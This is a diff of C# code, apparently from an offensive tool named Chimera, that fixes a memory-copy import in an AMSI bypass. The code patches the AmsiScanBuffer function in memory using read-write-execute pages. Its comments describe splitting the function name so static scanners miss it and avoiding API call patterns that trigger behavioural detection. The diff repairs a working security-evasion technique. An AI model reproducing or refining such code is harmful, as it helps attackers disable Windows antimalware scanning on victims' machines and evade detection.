@@ -26,8 +26,9 @@ namespace Chimera.Commands
         // PAGE_EXECUTE_READWRITE
         private const uint PAGE_RWX = 0x40;
 
+        // RtlCopyMemory is an inline macro in x64 ntdll — use RtlMoveMemory which is a real export.
         [DllImport("ntdll")]
-        private static extern uint RtlCopyMemory(IntPtr dst, IntPtr src, UIntPtr len);
+        private static extern void RtlMoveMemory(IntPtr dst, IntPtr src, UIntPtr len);
 
         // Split string so static scanner doesn't see "AmsiScanBuffer" as a literal.
         // Assembled at runtime from neutral fragments.
@@ -73,7 +74,7 @@ namespace Chimera.Commands
                 // avoids the Marshal.Copy + VirtualProtect behavioral combo that triggers !ml.
                 IntPtr patchPtr = Marshal.AllocHGlobal(patch.Length);
                 Marshal.Copy(patch, 0, patchPtr, patch.Length);
-                RtlCopyMemory(fnAddr, patchPtr, (UIntPtr)patch.Length);
+                RtlMoveMemory(fnAddr, patchPtr, (UIntPtr)patch.Length);
                 Marshal.FreeHGlobal(patchPtr);
 
                 // Restore page protection
